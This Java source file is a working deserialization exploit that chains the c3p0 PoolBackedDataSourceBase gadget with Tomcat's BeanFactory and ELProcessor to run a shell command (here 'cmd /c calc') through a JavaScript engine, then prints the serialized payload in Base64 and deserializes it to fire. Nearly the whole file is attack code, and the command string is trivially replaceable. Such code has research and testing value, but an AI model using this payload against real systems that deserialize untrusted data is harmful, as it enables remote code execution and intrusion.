import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;

import javax.naming.*;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.Base64;
import java.util.logging.Logger;
import org.apache.naming.ResourceRef;

public class BeanFactoryTest {
    private static final class ConnectionPool implements ConnectionPoolDataSource, Referenceable {

        private String className;
        private String url;

        public ConnectionPool ( String className, String url ) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference () throws NamingException {
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
            ref.add(new StringRefAddr("forceString", "x=eval"));
            String cmd = "calc";
            ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','"+ cmd +"']).start()\")"));
            return ref;
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}

    }
    public static void main(String[] args) throws Exception{

        Constructor constructor = Class.forName("com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase").getDeclaredConstructor();
        constructor.setAccessible(true);
        PoolBackedDataSourceBase obj = (PoolBackedDataSourceBase) constructor.newInstance();

        ConnectionPool connectionPool = new ConnectionPool("org.apache.naming.factory.BeanFactory",null);
        Field field = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
        field.setAccessible(true);
        field.set(obj, connectionPool);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.close();
        System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));

        ByteArrayInputStream bais = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}
